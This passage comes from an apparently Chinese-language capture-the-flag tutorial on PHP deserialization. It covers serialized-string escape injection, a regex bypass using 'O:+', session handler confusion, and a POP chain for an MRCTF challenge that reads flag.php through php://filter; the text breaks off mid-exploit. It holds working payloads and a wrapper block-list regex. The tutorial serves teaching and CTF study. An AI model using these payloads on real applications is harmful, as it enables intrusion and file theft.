class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>得到结果</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"message\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"from\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">118</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"y\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"to\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"z\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token string double-quoted-string\">\";s:3:\"</span>msg<span class=\"token string double-quoted-string\">\";s:1:\"</span>y<span class=\"token string double-quoted-string\">\";s:2:\"</span>to<span class=\"token string double-quoted-string\">\";s:1:\"</span>z<span class=\"token string double-quoted-string\">\";s:6:\"</span>quan9i<span class=\"token string double-quoted-string\">\";s:1:\"</span><span class=\"token number\">0</span>\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//;&#125;实现了闭合，后面的不再看，所以后面的那个quan9i为0就不会生效，也不会影响反序列化</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时显示有118个字符，而<code>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq</code>也正好是118个，与其字符匹配，此时就构造出了quan9i为1，我们输出一下来进行验证</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\";s:3:\"msg\";s:1:\"y\";s:2:\"to\";s:1:\"z\";s:6:\"quan9i\";s:1:\"1\";&#125;'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'y'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'z'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'qq'</span><span class=\"token punctuation\">,</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span><span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545283.png\" alt=\"在这里插入图片描述\"><br>此时也就达到了我们的目的，成功的实现了反序列化的字符串逃逸</p>\n<h2 id=\"绕过正则函数\"><a href=\"#绕过正则函数\" class=\"headerlink\" title=\"绕过正则函数\"></a>绕过正则函数</h2><p>在做部分题时会遇到如下代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^O:\\d+/'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>他的含义呢就是以O开头的，类似于<code>O:6</code>这种的就会被过滤掉，而绕过方法呢，就是在这里加上一个<code>+</code>号，也就是<code>O:+6</code>，就可以成功绕过。</p>\n<h2 id=\"利用引用\"><a href=\"#利用引用\" class=\"headerlink\" title=\"利用引用\"></a>利用引用</h2><p><code>&amp;</code>这个符号跟在一个变量前，被赋值给另一个变量时，另一个变量变化时，这个变量的值也会受到影响，具体例子如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'we are best'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$a</span></span>\\t\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'quan9i is good'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>输出<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545232.png\" alt=\"在这里插入图片描述\"><br>因此当要求两个变量完全相等时，可以用&amp;来进行绕过</p>\n<h2 id=\"session反序列化\"><a href=\"#session反序列化\" class=\"headerlink\" title=\"session反序列化\"></a>session反序列化</h2><p>session反序列化，需要了解什么是session</p>\n<p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p>\n<p>session是如何发挥其作用的呢</p>\n<p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>\n<p>在session反序列化中通常还用到了<code>session_start()</code>函数，此函数的简单介绍如下</p>\n<p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</p>\n<p>此时对session有了一定的了解，再来说一下session对反序列化的三种存储方式<br>先简单介绍一下三种存储方式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">选择器\t\t\t存储格式\t\t\t\t\t\t\t\t\t\t\t\t\t示例\nphp_serialize\t经过 <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数序列化数组\t\t\t\t\t\t\ta<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span>“name”<span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span>“ocean”<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\nphp（默认）\t\t键名 竖线 经过 <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数处理的值\t\t\t\t\t<span class=\"token class-name\">name</span><span class=\"token operator\">|</span><span class=\"token class-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span>“ocean”<span class=\"token punctuation\">;</span>\nphp_binary\t\t键名的长度对应的ascii字符 键名 <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数序列化的值\tname s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span>“spoock”<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的话简单讲解一下<code>php_serialize</code>和<code>php</code>两种存储方式</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_session</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'ssss'</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n//没写存储方式，默认的话就是php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545427.png\" alt=\"在这里插入图片描述\"><br>此时我们去临时目录下查看此文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545430.png\" alt=\"在这里插入图片描述\"><br>其内值如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token class-name\">aaa</span><span class=\"token operator\">|</span><span class=\"token class-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"bbb\"</span><span class=\"token punctuation\">;</span><span class=\"token class-name\">quan9i</span><span class=\"token operator\">|</span><span class=\"token class-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"sss\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//php的结果</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时我们再更换方式为php_serialize</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'session.serialize_handler'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'php_serialize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'sss'</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>其内值如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"sss\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>可以发现前者的话有个|，|前面是类名，后面是值，后面则不然，如若此时我们在后面加上|，举个栗子</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"quan9i\"</span><span class=\"token punctuation\">;</span><span class=\"token operator\">|</span><span class=\"token class-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"sss\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时用php序列化来读当然是没问题，但是当用php来读时，<code>a:1:&#123;s:6:&quot;quan9i&quot;;</code>就会被视为键名，而<code>s:3:&quot;sss&quot;;&#125;</code>会被视为键值，那么此时后面的我们可以任意写，题目中出现的任何类我们这里都可以进行调用</p>\n<h2 id=\"POP链构造\"><a href=\"#POP链构造\" class=\"headerlink\" title=\"POP链构造\"></a>POP链构造</h2><p>以MRCTF为例进行讲解，题目代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//flag is in flag.php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Modifier</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Show</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Welcome to '</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">str</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Test</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>我们通过观察可以发现， <code>Modifier</code>类的 <code>append</code>函数可以实现文件包含，那毋庸置疑它就是本题的突破口，我们看到<code>append</code>函数是<code>__invoke</code>魔术函数来调用的，这个魔术函数是当对象被当做函数调用时触发，那么此时我们就找带<code>()</code>的，这种如果把它变成对象肯定就可以触发，这时候就发现<code>Test</code>类中的<code>__get</code>魔术函数，它是当访问不存在的变量时触发，那么在这里的话就看到<code>show</code>类中的<code>__toString</code>魔术方法，而<code>__tostring</code>是当对象被视为字符串时调用，此时就又走到了<code>__wakeup</code>函数这里，因为它后面是<code>$this-&gt;source</code>，我们只需要将source变成对象，就可以触发<code>__tostring</code>魔术函数，<code>__wakeup</code>是当有<code>unserialize()</code>时调用，我们可以看到题目代码中一旦我们传入pop参数，就会进行反序列化</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>此时推理就完成了，接下来构造对应的pop链即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//flag is in flag.php </span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Modifier</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'php://filter/read=convert.base64-encode/resource=flag.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Show</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Welcome to '</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">str</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Test</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token 